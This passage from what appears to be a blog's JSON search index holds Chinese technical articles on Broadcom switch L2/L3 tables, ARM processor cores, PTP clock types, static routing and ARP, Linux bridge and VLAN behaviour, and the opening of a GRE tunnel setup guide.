56504的L2地址表大小为16K，5630X的L2地址表大小为8K，地址表使用MAC+VID的hash值作为索引查表。实际上56504的L2地址表hash值为4K，每个hash值对应4条地址，这样最多可以保存4条hash冲突的地址。地址表中每个表项都保存了MAC_ADDR和VLAN_ID。MAC学习的时候使用原MAC+VID的hash查表，把表中的MAC+VID与包中的MAC+VID进行比较，如果完全相等，表示找到了。然后看端口（TGID_PORT）是否相等，如果不相等表示地址发生了迁移， 对于动态学习的地址需要更新port；如果相等表示命中，更新hit标志。其他几个重要的功能介绍如下： 1) 设置静态地址 ：STATIC_BIT＝1 2) 设置L3转发标志 ：L3＝1 3) 设置本地址的包都转发到CPU去：CPU=1 4) 设置本地址匹配的包丢弃：SRC_DISCARD=1、DST_DISCARD=1 5) 设置本地址匹配的包对某些端口阻塞：MAC_BLOCK_INDEX 6) 设置本地址匹配的包镜像：MIRROR＝1 7) 设置组播索引：L2MC_PTR 8) 地址有效标志：VALID＝1 2.4.3 VLAN表Vlan表分为ingress和egress两个部分，分别对应入口控制和出口控制。 图7 ingress vlan表 Ingress Vlan表中主要包含了端口列表，用于ingress filter功能。PFM是用于控制组播洪泛的开关。PFM＝0，组播在vlan内洪泛；PFM＝1，注册的组播按组播表转发，未注册的组播在vlan内洪泛；PFM＝2，注册的组播按组播表转发，未注册的组播丢弃。STG用于标识本vlan所属的生成树组。 图8 egress vlan表 Egress vlan表中除了PFM和STG外，还包含了出口方向的端口位图，以及哪些端口以untag的方式发送本vlan的包。 2.4.4 egress port表 图5 egress port表 EGR_PORT是一组寄存器，每个端口一个，用于EGRESS方向的控制，有几个重要设置介绍如下： 1) 设置egress端口类型：PORT_TYPE＝0，UNI端口；PORT_TYPE＝1，NNI端口 2) 设置egress过滤：EN_EFILTER＝1 # L3转发流程 图9 L3转发流程 如果查目的MAC地址表的时候发现L3bit置位了，就进入到L3转发流程。与L2交换相比，L3交换可以实现跨VLAN转发，而且它的转发依据不是根据目的MAC地址，而是根据目的IP。 涉及到的表： 主机路由表 子网路由表 EGRESS下一跳表 终端设备信息 修改目的信息的依据 接口表 交换设备信息 修改源的信息的依据 INGRESS下一跳表 找到物理端口 L3转发的流程 第一步: 对L3头部进行校验，校验和错的包直接丢弃； 第二步: 进行原IP地址查找 如果主机路由表中没有找到，会上报给CPU，CPU会进行相应的处理，并更新L3表；（先以源地址查找是想确认下是否有站点漂移的现象和更新L3表。An example of a station movement is when a connection from port 1 is moved to port 2 but the SIP remains the same. Unless the software updates the L3 table, packets that are destined to that DIP are forwarded to port 1.） 第三步：进行目的IP地址查找， 如果主机路由表中没有找到，就会在子网路由表中进行查找，在子网路由表中进行最长子网匹配的查找算法，如果在子网路由表中还没有找到，则送给CPU进行处理， 如果主机路由表或子网路由表中找到了， 就会得到INGRESS/EGRESS下一跳的指针NEXT_HOP_INDEX(ING_L3_NEXT_HOP和EGR_L3_NEXT_HOP)。 注:经过查看sdk可以发现路由表和EGRESS下一跳表在一个结构体中定义的。 如果ECMP使能的话，会得到ECMP的指针和ECMP的个数，从而根据hash算法得到一个下一跳指针。下一条表项中包含了下一跳的MAC地址和接口表的索引。 最后在包转发出去的时候， 用EGRESS下一跳表 查到 目的MAC地址 替换掉包的目的MAC地址。 用EGRESS下一跳表 查到 接口表。 用 接口表 查到 接口MAC地址和VLAN替换掉包的原MAC地址和VLAN。 用INGRESS下一跳表 查到 出端口。 注意：通过代码分析，我们的56151并没有用到EGRESS/INGRESS L3有关的几个重要的表介绍 3层主机路由表 v4单播：1024 v4组播：512 v6单播：512 v6组播: 256 3层LPM路由表 v4单播: 512 v6单播: 256 包含最长前缀匹配IPv4和IPv6子网路由，包括ECMP/ ECMP路由 接口表 a virtual interface corresponding to a particular routed VLAN 与特殊路由VLAN相对应的虚拟接口 and has an associated IP address and MAC address 并且关联IP地址和MAC地址 作用：包含交换机的接口mac地址，包在转发时替换愿mac地址 EGRESS 下一跳表 作用：包含出接口下一跳的mac地址 包在转发时替换目的mac地址 相当于arp表 INGRESS下一跳表 作用：包含目的端口 L3有关的几个重要的表详细信息 图10 L3单播主机路由表 图11 L3子网路由表 图14 接口表 图13 EGRESS 下一跳表 图15 INGRESS 下一跳表 图12 ECMP表 MPLS相关表 # 特殊数据包上CPU设置 摘抄：BCM53115的CFP共支持256条规则。这些规则依次保存在物理的TCAM Entry（Ternary Content-Aware Memory）中，索引号0~255。 设置方法一： 已经封装好的特殊包上cpu接口 参考igmp：bcm_switch_control_set(ulUnit,bcmSwitchIgmpPktToCpu,FALSE); 设置方法二：利用策略上cpu 参考ptp：STATUS bcm_ssp_specified_dstmac_packet_tocpu(bcm_mac_t date,bcm_mac_t mask); fdb表初始化默认规则修改： 参考ptp：STATUS bcm_ssp_ptpd_pdelay_packet_tocpu(void) BCM芯片FP原理及相关SDK数据结构介绍 http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1205&amp;fromuid=1 BCM交换芯片策略路由功能 http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1204&amp;fromuid=1 # 代码分析 UNK可以说是UNP的内核形态，以下可以做UNP框架的参考： 根据以上框架可以确定开发的重点为SSP的开发。SSP是通过SDK封装的应用接口库。所以还需学习SDK提供的API函数。 BCM5615提供的SDK中包含的L3 APIL3 Ingress Interface APIsL3 Egress Table APIsL3 VRFL3 VRRPL3 NAT SDK具体可参考：《56XX-PG632-RDS_API_decrypted.pdf》 SSP代码可参考：[bcmRoute.c][bcmRouteHw.c] UNP库的使用UNP注册函数 STATUS mvRouteHwapiInit() { STATUS rc = UNP_OK; UNP_hwApiModuleReg_t routeHwApiModuleReg; routeHwApiModuleReg.funcPortGet = NULL; routeHwApiModuleReg.funcPortSet = NULL; routeHwApiModuleReg.funcSwitchGet = NULL; routeHwApiModuleReg.funcSwitchSet = mvRouteSwitchValueSet; routeHwApiModuleReg.funcStructGet = NULL; routeHwApiModuleReg.funcStructSet = mvRouteSwitchStructSet; routeHwApiModuleReg.funcStructDel = NULL; rc = UNP_hwapiModuleFuncReg(&amp;amp;routeHwApiModuleReg, UNP_MID_ROUTEMANAGE); return rc; } 使用注册函数 UNP_CHECK_ERROR(UNP_hwSwitchValueSet(UNP_HW_VRRPACCESS_ENABLE, ulVrrpEnable)); # MPLS相关 内核支持 MPLS can be built as a kernel module, or it can be built in a kernel. To build MPLS first you need to run: $ make menuconfig and enable MPLS compiling from: Network setup -&gt; Networking options -&gt; MPLS (Experimental) If you’re running Debian based system, nice HOW-TO on compiling and installing custom kernel can be found here: https://help.ubuntu.com/community/Kernel/Compile quagga支持quagga已经有mpls的分支版本 –enable-mpls=linux –enable-ldpd broadcom支持Theory of Operation：没有提到 Network Switching Software Development Kit Release 6.3.2： 有相关api说明，并提到StrataXGS III provides MPLS functionality 临时总结： 其实路由表等不一定非要下硬件，只是下硬件后转发快了。 所以可以总结，控制信息有哪些， 路由信息有哪些。 哪些需要上cpu，哪些不需要上。 quagga保存的所有信息，和需要接收的所有信息。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57","slug":"EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57","date":"2019-08-29T04:18:26.852Z","updated":"2019-08-29T04:16:30.405Z","comments":true,"path":"EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57.html","excerpt":"前不久ARM正式宣布推出新款ARMv8架构的Cortex-A50处理器系列产品，以此来扩大ARM在高性能与低功耗领域的领先地位，进一步抢占移动终端市场份额。Cortex-A50是继Cortex-A15之后的又一重量级产品，将会直接影响到主流PC市场的占有率","text":"前不久ARM正式宣布推出新款ARMv8架构的Cortex-A50处理器系列产品，以此来扩大ARM在高性能与低功耗领域的领先地位，进一步抢占移动终端市场份额。Cortex-A50是继Cortex-A15之后的又一重量级产品，将会直接影响到主流PC市场的占有率。围绕该话题，我们今天不妨总结一下近几年来手机端较为主流的ARM处理器。 以由高到低的方式来看，ARM处理器大体上可以排序为：Cortex-A57处理器、Cortex-A53处理器、Cortex-A15处理器、Cortex-A12处理器、Cortex-A9处理器、Cortex-A8处理器、Cortex-A7处理器、Cortex-A5处理器、ARM11处理器、ARM9处理器、ARM7处理器，再往低的部分手机产品中基本已经不再使用，这里就不再介绍。 ARM 处理器架构发展 ● Cortex-A57、A53处理器 Cortex-A53、Cortex-A57两款处理器属于Cortex-A50系列，首次采用64位ARMv8架构，意义重大，这也是ARM最近刚刚发布的两款产品。 Cortex-A57是ARM最先进、性能最高的应用处理器，号称可在同样的功耗水平下达到当今顶级智能手机性能的三倍；而Cortex-A53是世界上能效最高、面积最小的64位处理器，同等性能下能效是当今高端智能手机的三倍。这两款处理器还可整合为ARM big.LITTLE（大小核心伴侣）处理器架构，根据运算需求在两者间进行切换，以结合高性能与高功耗效率的特点，两个处理器是独立运作的。 应用案例：预计于2014年推出。 ● Cortex-A15处理器架构解析 ARM Cortex-A15处理器隶属于Cortex-A系列，基于ARMv7-A架构，是业界迄今为止性能最高且可授予许可的处理器。 Cortex-A15 MPCore处理器具有无序超标量管道，带有紧密耦合的低延迟2级高速缓存，该高速缓存的大小最高可达4MB。浮点和NEON媒体性能方面的其他改进使设备能够为消费者提供下一代用户体验，并为 Web 基础结构应用提供高性能计算。Cortex-A15处理器可以应用在智能手机、平板电脑、移动计算、高端数字家电、服务器和无线基础结构等设备上。 理论上，Cortex-A15 MPCore处理器的移动配置所能提供的性能是当前的高级智能手机性能的五倍还多。在高级基础结构应用中，Cortex-A15 的运行速度最高可达2.5GHz，这将支持在不断降低功耗、散热和成本预算方面实现高度可伸缩的解决方案。 应用案例：三星Exynos 5250。三星Exynos 5250芯片是首款A15芯片，应用在了最近发布的Chromebook和Nexus 10平板电脑上面。Exynos 5250的频率是1.7GHz，采用32纳米的HKMG工艺，配备了Mali-604 GPU，性能强大。另外据传三星下一代Galaxy S4将会搭载四核版的Exynos 5450芯片组，同样应用Cortex-A15内核。另外NVIDIA Tegra 4会采用A15内核。 ● Cortex-A12处理器架构解析 2013中旬，ARM 发布了全新的Cortex-A12处理器，在相同功耗下，Cortex-A12的性能上比Cortex-A9提升了40%，同时尺寸上也同样减小了30%。Cortex-A12也同样能够支持big.LITTLE技术，可以搭配Cortex-A7处理器进一步提升处理器的效能。 Cortex-A12架构图 ARM表示Cortex-A12处理器未来将应用于大量的智能手机以及平板产品，但更加侧重于中端产品。同时ARM也预计在2015年，这些中端产品在数量上将远超过旗舰级别的智能手机及与平板。 搭载Cortex-A12处理器的中端机在未来也将是非常有特点的产品，因为Cortex-A12能够支持虚拟化、AMD TrustZone技术，以及最大1TB的机身存储。这也就意味着未来搭载这一处理器的智能手机完全可以作为所谓的BYOD（Bring Your Own Device）设备使用，换句话说就是在作为自用手机的同时，还可以用作商务手机存储商务内容。 Mali-V500架构图 同时Cortex-A12也搭载了全新的Mali-T622绘图芯片与Mali-V500视频编解码IP解决方案，同样也是以节能为目标。这样看来，定位中端市场，低功耗小尺寸，Cortex-A12最终必然会取代Cortex-A9。据悉，Cortex-A12将于2014年投放市场，到时候我们也许会迎来中端市场的一次改变。 应用案例：2014年发布。 ● Cortex-A9处理器架构解析 ARM Cortex-A9处理器隶属于Cortex-A系列，基于ARMv7-A架构，目前我们能见到的四核处理器大多都是属于Cortex-A9系列。 Cortex-A9 处理器的设计旨在打造最先进的、高效率的、长度动态可变的、多指令执行超标量体系结构，提供采用乱序猜测方式执行的 8 阶段管道处理器，凭借范围广泛的消费类、网络、企业和移动应用中的前沿产品所需的功能，它可以提供史无前例的高性能和高能效。 Cortex-A9 微体系结构既可用于可伸缩的多核处理器（Cortex-A9 MPCore多核处理器），也可用于更传统的处理器（Cortex-A9单核处理器）。可伸缩的多核处理器和单核处理器支持 16、32 或 64KB 4 路关联的 L1 高速缓存配置，对于可选的 L2 高速缓存控制器，最多支持 8MB 的 L2 高速缓存配置，它们具有极高的灵活性，均适用于特定应用领域和市场。 应用案例：德州仪器OMAP 4430/4460、Tegra 2、Tegra 3、新岸线NS115、瑞芯微RK3066、联发科MT6577、三星 Exynos 4210、4412、华为K3V2等。另外高通APQ8064、MSM8960、苹果A6、A6X等都可以看做是在A9架构基础上的改良版本。 ● Cortex-A8处理器架构解析 ARM Cortex-A8处理器隶属于Cortex-A系列，基于ARMv7-A架构，是我们目前使用的单核手机中最为常见的产品。 ARM Cortex-A8处理器是首款基于ARMv7体系结构的产品，能够将速度从600MHz提高到1GHz以上。Cortex-A8处理器可以满足需要在300mW以下运行的移动设备的功率优化要求；以及需要2000 Dhrystone MIPS的消费类应用领域的性能优化要求。 Cortex-A8 高性能处理器目前已经非常成熟，从高端特色手机到上网本、DTV、打印机和汽车信息娱乐，Cortex-A8处理器都提供了可靠的高性能解决方案。 应用案例：[MYS-S5PV210开发板、TI OMAP3系列、苹果A4处理器（iPhone 4）、三星S5PC110（三星I9000）、瑞芯微RK2918、联发科MT6575等。另外，高通的MSM8255、MSM7230等也可看做是A8的衍生版本。 ● Cortex-A7处理器架构解析 ARM Cortex-A7处理器隶属于Cortex-A系列，基于ARMv7-A架构，它的特点是在保证性能的基础上提供了出色的低功耗表现。 Cortex-A7处理器的体系结构和功能集与Cortex-A15 处理器完全相同，不同这处在于，Cortex-A7 处理器的微体系结构侧重于提供最佳能效，因此这两种处理器可在big.LITTLE（大小核大小核心伴侣结构）配置中协同工作，从而提供高性能与超低功耗的终极组合。单个Cortex-A7处理器的能源效率是ARM Cortex-A8处理器的5倍，性能提升50%，而尺寸仅为后者的五分之一。 作为独立处理器，Cortex-A7可以使2013-2014年期间低于100美元价格点的入门级智能手机与2010 年500美元的高端智能手机相媲美。这些入门级智能手机在发展中世界将重新定义连接和Internet使用。 应用案例：全志Cortex-A7四核平板芯片，联发科刚刚发布的MT6589。 ● Cortex-A5处理器架构解析 ARM Cortex-A5处理器隶属于Cortex-A系列，基于ARMv7-A架构，它是能效最高、成本最低的处理器。 Cortex-A5处理器可为现有ARM9和ARM11处理器设计提供很有价值的迁移途径，它可以获得比ARM1176JZ-S更好的性能，比ARM926EJ-S更好的功效和能效。另外，Cortex-A5处理器不仅在指令以及功能方面与更高性能的Cortex-A8、Cortex-A9和Cortex-A15处理器完全兼容，同时还保持与经典ARM处理器（包括ARM926EJ-S、ARM1176JZ-S和 ARM7TDMI）的向后应用程序兼容性。 应用案例：高通MSM7227A/7627A（新渴望V、摩托罗拉XT615、诺基亚610、中兴V889D、摩托罗拉DEFY XT等）、高通MSM8225/8625（小辣椒双核版、华为U8825D、天语 W806+、innos D9、酷派7266等）、米尔 MYD-SAMA5D3X](http://www.myir-tech.com/product/mys-s5pv210.htm)系列开发板（MYD-SAMA5D31、MYD-SAMA5D33、MYD-SAMA5D34、MYD-SAMA5D35）。 MYD-SAMA5D3X开发板 ● ARM11系列处理器架构解析 ARM11系列包括了ARM11MPCore处理器、ARM1176处理器、ARM1156处理器、ARM1136处理器，它们是基于ARMv6架构，分别针对不同应用领域。ARM1156处理器主要应用在高可靠性和实时嵌入式应用领域，与手机关联不大，此处略去介绍。 ARM11 MPCore使用多核处理器结构，可实现从1个内核到4个内核的多核可扩展性，从而使具有单个宏的简单系统设计可以集成高达单个内核的4倍的性能。Cortex-A5处理器是ARM11MPCore的相关后续产品。 ARM1176处理器主要应用在智能手机、数字电视和电子阅读器中，在这些领域得到广泛部署，它可提供媒体和浏览器功能、安全计算环境，在低成本设计的情况下性能高达1GHz。 ARM1136处理器包含带媒体扩展的ARMv6 指令集、Thumb代码压缩技术以及可选的浮点协处理器。ARM1136是一个成熟的内核，作为一种应用处理器广泛部署在手机和消费类应用场合中。在采用 90G工艺时性能可达到600MHz以上，在面积为2平方毫米且采用65纳米工艺时可达到1GHz。 应用案例：高通MSM7225（HTC G8）、MSM7227（HTC G6、三星S5830、索尼爱立信X8等）、Tegra APX 2500、博通BCM2727（诺基亚N8）、博通BCM2763（诺基亚PureView 808）、 Telechip 8902（平板电脑）。 ● ARM9系列和ARM7系列处理器架构解析 ARM9系列处理器系列包括ARM926EJ-S、ARM946E-S和 ARM968E-S处理器。其中前两者主要针对嵌入式实时应用，我们这里就主要针对ARM926EJ-S进行介绍。 ARM926EJ-S基于ARMv5TE架构，作为入门级处理器，它支持各种操作系统，如Linux、Windows CE和Symbian。ARM926EJ-S 处理器已授权于全球100多家硅片供应商，并不断在众多产品和应用中得到成功部署，应用广泛。 应用案例：TI OMAP 1710。诺基亚N73、诺基亚E65、三星SGH-i600等手机采用的都是该处理器，以及包括米尔科技的 MYS-SAM9X5 系列工控开发板。 ARM9 开发板 ● ARM7系列处理器 ARM7系列处理器系列包括ARM7TDMI-S（ARMv4T架构）和ARM7EJ-S（ARMv5TEJ架构），最早在1994推出，相对上面产品来说已经显旧。虽然现在ARM7处理器系列仍用于某些简单的32位设备，但是更新的嵌入式设计正在越来越多地使用最新的ARM处理器，这些处理器在技术上比ARM 7系列有了显著改进。 作为目前较旧的一个系列，ARM7处理器已经不建议继续在新品中使用。它究竟有多老呢？上面的Apple eMate 300使用的就是一款25MHz的ARM7处理器，够古老了吧？ ● 相关文章 ARM最新开发工具DS-5到底是什么？有什么用？ ARM处理器体系架构详细说明 ARM 开发工具 DS-5 RVDS MDK-ARM 比较区别和选择 本文来自米尔科技，原文地址： http://www.myir-tech.com/resource/448.asp，转载请注明出处。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"1588v2（PTP）协议实体类型详解","slug":"EMBEDDED/1588v2（PTP）协议实体类型详解","date":"2019-08-29T04:18:26.837Z","updated":"2019-08-29T04:16:22.525Z","comments":true,"path":"EMBEDDED/1588v2（PTP）协议实体类型详解.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/1588v2（PTP）协议实体类型详解.html","excerpt":"PTP共有5种实体类型： * 普通时钟（Ordinaryclock）， * 边界时钟（Boundaryclock）， * E2E透传时钟（End-to-end transparent clock）， * P2P透传时钟（","text":"PTP共有5种实体类型： 普通时钟（Ordinaryclock）， 边界时钟（Boundaryclock）， E2E透传时钟（End-to-end transparent clock）， P2P透传时钟（Peer-to-peer transparent clock）， 管理节点。 普通时钟 普通时钟只有一个PTP物理通信端口和网络相连，一个物理端口包括2个逻辑接口，事件接口（event interface）和通用接口（general interface）。事件接口接收和发送需要打时间标签的事件消息。通用接口接收和发送其他消息。一个普通时钟只有一个PTP协议处理器。在网络中，普通时钟可以作为祖父时钟（grandmaster clock）或从时钟（slave clock）。当作为祖父时钟是，其PTP端口处于主状态（master），作为从时钟时其PTP端口处于从状态（slave），普通时钟的框图如下： 框图中的协议引擎主要完成： 发送和接收协议消息。 维护时钟和端口数据 执行PTP状态机的处理功能。 如果普通时钟是作为从时钟，则根据PTP协议计算父时钟的时间。 一个普通时钟维护两套数据：时钟相关的数据和端口相关的数据，时钟相关的数据有： &lt;/span&gt;&lt;/span&gt; Default数据：用于描述普通时钟的属性。 Current数据：用于描述同步相关的属性。 父时钟和祖父时钟数据：用于描述父时钟和祖父时钟的属性。 时间特性：用于描述时标的属性。 端口相关的数据包括端口的属性以及PTP状态的数据。 &lt;/span&gt;&lt;/span&gt; 当普通时钟的端口是从状态时，时钟控制环路用来控制本地时钟和父时钟同步。当普通时钟作为祖父时钟时，本地时钟要么自由振荡要么同步于外部的时钟源（如GPS等）。 边界时钟 边界时钟有多个PTP物理通信端口和网络相连，每个物理端口包括2个逻辑接口，事件接口和通用接口。边界时钟的每个PTP端口和普通时钟的PTP端口一样，除了以下几点： 边界时钟的所有端口共同使用一套时钟数据。 边界时钟的所有端口共同使用一个本地时钟。 每个端口的协议引擎增加一个功能：从所有端口中选择一个端口作为本地时钟的同步输入。 协议引擎将总结和同步相关（包括建立时钟同步层次）的消息和信令。但可以转发管理消息。边界时钟的框图如下： &lt;/span&gt;&lt;/span&gt; E2E透传时钟 E2E透传时钟像路由器或交换机一样转发所有的PTP消息，但对于事件消息，有一个停留时间桥计算该消息报文在本点停留的时间（消息报文穿过本点所花的时间），停留时间将累加到消息报文中的”修正”（correction field）字段中。修正过程如下图： E2E透传时钟的框图如下： 用于计算停留时间的时间戳是由本地时钟产生的，所以本地时钟和时间源的时钟之间的频率差会造成误差。最好是本地时钟去锁定时钟源时钟。如果本地时钟锁定的不是时间源时钟则要求其精度能到达一定标准,以本地时钟是三级钟为例，1ms的停留时间大约造成5ns的误差。 E2E透传时钟可以和普通时钟合在一起作为一个网络单元，其框图如下： 在上图中，如果普通时钟是从时钟，停留时间桥将接收到的时间消息，宣称消息，由输入的时钟同步消息产生的时间戳以及内部的停留时间传送给协议引擎，协议信息根据这些信息计算出正确的时间并以此控制本地时钟。如果普通时钟是主时钟，协议引擎将产生Sync和Followup消息，消息中发送时间戳由本地时钟基于内部停留时间和输出时间戳产生（it would originate Sync and Follow_Up messages with the sendingtimestamps referenced to the local clock of the ordinary clock and based oninternal timing corrections and the egress timestamp.）在实现中，透传时钟和普通时钟使用同一个本地时钟。 P2P透传时钟 P2P透传时钟和E2E透传时钟只是对PTP时间消息的修正和处理方法不同，在其他方面是完全一样的。P2P透传时钟可以和E2E透传时钟一样与普通时钟合在一起作为一个网络单元。 P2P透传时钟的框图如下： P2P透传时钟对每个端口有一个模块用来测量该端口和对端端口的link延时，对端端口也必须支持P2P模式。link的延时通过交换Pdelay_Req, Pdelay_Resp以及可能的Pdelay_Resp_Follow_Up消息测量出。P2P透传时钟仅仅修正和转发Sync和Followup消息。本地的停留时间和收到消息的端口的link延时均记入修正。修正过程如下图： 因为P2P的修正包括了link延时和停留时间，其修正域反映了整个路径的延时，从时钟可以根据Sync消息计算出正确的时间，而不需要再发Delay测量消息。再发生时钟路径倒换的时候，P2P方式基本不受影响，而E2E方式则需要在进行过新的延时测量之后，才能计算出正确的时间。 管理节点 管理节点向人或程序提供PTP管理消息的接口，管理节点可以和任意时钟合在一起。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"静态路由使用下一跳IP与出接口的区别","slug":"NETWORK/静态路由使用下一跳IP与出接口的区别","date":"2019-08-29T04:16:16.229Z","updated":"2019-08-29T04:14:32.870Z","comments":true,"path":"NETWORK/静态路由使用下一跳IP与出接口的区别.html","link":"","permalink":"http://demonelf.github.io/NETWORK/静态路由使用下一跳IP与出接口的区别.html","excerpt":"配置下一跳为出接口的 好处是不用知道下一跳具体ip可以实现动态学习的效果 缺点在于下一跳路由器必须支持这种基本的arp代理功能. 拓扑图： 以太网链路中：两个接口之间的通信是靠MAC地址，根据MAC地址，将数据封装成数据帧后传送到网络，进而通过物理","text":"配置下一跳为出接口的 好处是不用知道下一跳具体ip可以实现动态学习的效果 缺点在于下一跳路由器必须支持这种基本的arp代理功能. 拓扑图： 以太网链路中：两个接口之间的通信是靠MAC地址，根据MAC地址，将数据封装成数据帧后传送到网络，进而通过物理线路传送给对方。而获取到对端的MAC地址，是通过ARP来完成的。例：1，当静态路由中下一跳使用出接口时，路由器会认为目标网络和接口处在“直连网络”中。如：R1(config)#ip route 192.168.2.0 255.255.255.0f0/0查看路由表：R1#show ip route 在以太网直连网络中设备间的通信是靠ARP广播来获取到目标主机的MAC地址。即当R1要访问192.168.2.2这个ip地址时，R1会认为目标网络是和自己直连的（虽然这时候实际是静态路由），于是R1就要在F0/0口向网络发出ARP请求广播，来寻找192.168.2.2所对应的MAC地址。这时，如果R2启用了ARP代理，那么R2将代替R3应答此ARP请求，即R2告诉R1：192.168.2.2所对应的MAC地址是R2的F0/0接口的MAC。如果R2的ARP代理功能关闭，那么R1将不能ping通192.168.2.2使用出接口的弊端：如果R3后面接了些pc机，当R1要访问这些pc机时，都会产生一条该pc机和MAC地址对应的ARP条目缓存，如果pc机的数量很大，此缓存也会很大，会导致R1耗费很大内存来维护。2，当静态路由中下一跳使用ip地址时，路由表中显示的是下一跳地址。如：R1(config)#ip route 192.168.2.0 255.255.255.0 192.168.1.2查看路由表：R1#show ip route 这时去往192.168.2.2的网段只会维护一条ARP缓存，即192.168.1.2所对一个的是R2的F0/0接口地址。即使R3后面接了多台主机，也只需要维护这么一条ARP缓存记录。二：点到点网络环境下：无论是指定下一跳地址还是出接口，都是一样的。因为这种环境下使用HDLC和PPP等协议来进行二层封装，不需要进行ARP的解析。结论：1、在点到点网络环境下，无论是指定下一跳地址还是出接口，都是一样的2、在广播网络环境下，则不然。如果指定为出接口的话，那么不管数据包的目标地址是否有效，每次当数据包到达时都会触发一个ARP请求，又因为ARP代理功能在IOS环境下默认是打开的，这就意味着路由器需要配置大量的ARP高速缓存。而如果是指定为下一跳地址的话，仅当第一个去往目标网络的数据包到达时，才会触发ARP请求。本文出自 “天好” 博客，请务必保留此出处http://tianhaoblog.blog.51cto.com/6467511/1280163","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"关于linux 802","slug":"NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考","date":"2019-08-29T04:16:16.229Z","updated":"2019-08-29T04:14:25.606Z","comments":true,"path":"NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考.html","link":"","permalink":"http://demonelf.github.io/NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考.html","excerpt":"​ linux bridge - (brctl)实现了ieee 802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge device，每个bridge都对应不同","text":"​ linux bridge - (brctl)实现了ieee 802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge device，每个bridge都对应不同的vlan，在bridge内部，包通过fdb表来转发，但是这个fdb表里面并没有vlan的信息。如果要在多个bridge device之间通信，比必须在bridge device上创建vlan interface，然后配置路由，这样可以实现不同bridge之间的转发。​ linux vlan - (vconfig)实现了ieee 802.1q协议。802.1q本来应该是一个二层协议，但是linux的实现需要创建vlan interface,而且可以在vlan interface上配置ip地址。所以，这个interface可以放到路由表里面。一般来说，在这个interface上收到的包，会带这个interface配置的vlan id，而从这个interface发出去的包，会打上这个interface的vlan id. ​ 举一个例子。一个盒子有6个物理interface, eth0,eth1,eth2,eth3,eth4,eth5,eth6.​ bridge0 { eth0, eth1, eth2 }, vlan id 是2​ bridge1 { eth3, eth4, eth5 }, vlan id 是3​ eth0,eth1,eth2,eth3,eth4,eth5都在混杂模式，并且没有ip地址，它们是bridge的port.​ 创建vlan interface, bridge0.2, bridge1.3。在bridge0.2和bridge1.3上配置ip地址。vlan 2的机器，把bridge0.2的地址设置为缺省网关；vlan 3的机器，把bridge1.3设置为缺省网关。当有包要从vlan 2发往vlan 3是，它将送到bridge0.2，然后，通过路由，找到bridge1.3，然后由bridge1.3发出去。这个过程中，packet里面的vlan id会发生改变。​ 这个例子里面，要求从bridge port上收到的包都必须是打tag的，在bridge里面，并不能识别和处理tag，只有到三层的vlan interface才能识别并处理这些tag.在bridge是还会运行STP协议来消除回环，进而实现了link一级的HA。STP，RSTP都是没有vlan的概念，而后来的PVST,PVST+，以及MSTP等，都能识别vlan，并且能消除一个vlan里面的回环。 关于Bridge，可以参考：http://www.linuxfoundation.org/en/Net:Bridge关于Vlan,可以参考：http://www.candelatech.com/~greear/vlan.html关于STP，可以参考：http://en.wikipedia.org/wiki/Spanning_tree_protocol posted on 2011-03-23 18:04 flyonok","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"三层交换机路由设计方案","slug":"NETWORK/三层交换机路由设计方案","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:14:06.065Z","comments":true,"path":"NETWORK/三层交换机路由设计方案.html","link":"","permalink":"http://demonelf.github.io/NETWORK/三层交换机路由设计方案.html","excerpt":"","text":"","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"linux 下创建GRE隧道","slug":"NETWORK/linux 下创建GRE隧道","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:13:44.705Z","comments":true,"path":"NETWORK/linux 下创建GRE隧道.html","link":"","permalink":"http://demonelf.github.io/NETWORK/linux 下创建GRE隧道.html","excerpt":"其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。 1. GRE介绍 GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报","text":"其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。 GRE介绍GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报进行封装，使这些被封装的数据报能够在IPv4/IPv6 网络中传输。Tunnel 是一个虚拟的点对点的连接，提供了一条通路使封装的数据报文能够在这个通路上传输，并且在一个Tunnel 的两端分别对数据报进行封装及解封装。 一个X协议的报文要想穿越IP网络在Tunnel中传输，必须要经过加封装与解封装两个过程。要在Linux上创建GRE隧道，需要ip_gre内核模块，它是GRE通过IPv4隧道的驱动程序。 查看是否有加载ip_gre模块 12345678# modprobe ip_gre# lsmod | grep greip_gre 22432 